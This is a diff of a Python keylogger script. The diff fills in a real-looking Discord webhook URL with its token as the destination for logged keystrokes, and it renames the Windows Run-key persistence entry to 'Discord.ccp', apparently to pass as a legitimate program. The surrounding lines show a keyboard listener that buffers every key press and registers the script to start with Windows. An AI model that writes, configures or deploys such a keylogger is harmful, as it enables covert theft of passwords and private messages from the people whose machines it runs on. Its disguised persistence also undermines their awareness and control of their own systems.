@@ -4,8 +4,8 @@ from discord_webhook import DiscordWebhook
 import winreg
 import sys
 
-webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
-registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
+webhook_url = 'https://discord.com/api/webhooks/1443611463934541885/DSz9CG0SH6nlLv1Sga8ekI6KRrYPhe4-bhM7So4mB8AkizwS6CL5hIv7Rrv3rxzFUsYA'     # Paste here your Webhook URL (instructions in README.md)
+registry_name = 'Discord.ccp'     # Registry name for system startup execution
 keys_buffer = ''     # Create empty buffer variable *leave as it is*
 
 winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")     # Create registry key for automatic program execution after system startup
@@ -29,4 +29,5 @@ def on_press(key):     # Executes on each key pressed
         keys_buffer += key     # Concatenate new logged key presses to make it look simpler
 
 with Listener(on_press=on_press) as listener:
+
     listener.join()     # Start the listener                                                                                             
